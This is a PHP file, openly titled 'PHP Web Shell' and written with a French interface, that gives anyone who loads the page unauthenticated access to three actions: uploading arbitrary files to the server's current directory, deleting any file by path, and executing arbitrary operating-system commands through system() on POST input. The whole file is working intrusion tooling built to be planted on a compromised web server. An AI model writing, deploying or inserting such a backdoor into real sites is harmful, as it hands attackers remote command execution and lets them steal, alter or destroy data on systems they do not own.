<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>PHP Shell</title>
</head>
<body>
    <h1>PHP Web Shell</h1>

    <!-- Section pour uploader un fichier -->
    <h2>Uploader un fichier</h2>
    <form action="" method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Uploader">
    </form>
    <?php
    if (isset($_FILES['file'])) {
        // Utiliser le répertoire courant pour l'upload
        $target_file = basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
            echo "Le fichier " . htmlspecialchars(basename($_FILES["file"]["name"])) . " a été uploadé dans le répertoire courant.";
        } else {
            echo "Erreur lors de l'upload.";
        }
    }
    ?>


    <!-- Section pour supprimer un fichier -->
    <h2>Supprimer un fichier</h2>
    <form action="" method="POST">
        <input type="text" name="delete" placeholder="Chemin du fichier">
        <input type="submit" value="Supprimer">
    </form>
    <?php
    if (isset($_POST['delete'])) {
        $file_to_delete = $_POST['delete'];
        if (file_exists($file_to_delete)) {
            unlink($file_to_delete);
            echo "Le fichier " . htmlspecialchars($file_to_delete) . " a été supprimé.";
        } else {
            echo "Le fichier n'existe pas.";
        }
    }
    ?>

    <!-- Section pour exécuter des commandes -->
    <h2>Exécuter une commande</h2>
    <form action="" method="POST">
        <input type="text" name="cmd" placeholder="Entrez une commande">
        <input type="submit" value="Exécuter">
    </form>
    <?php
    if (isset($_POST['cmd'])) {
        $command = $_POST['cmd'];
        echo "<pre>";
        system($command);
        echo "</pre>";
    }
    ?>
</body>
</html>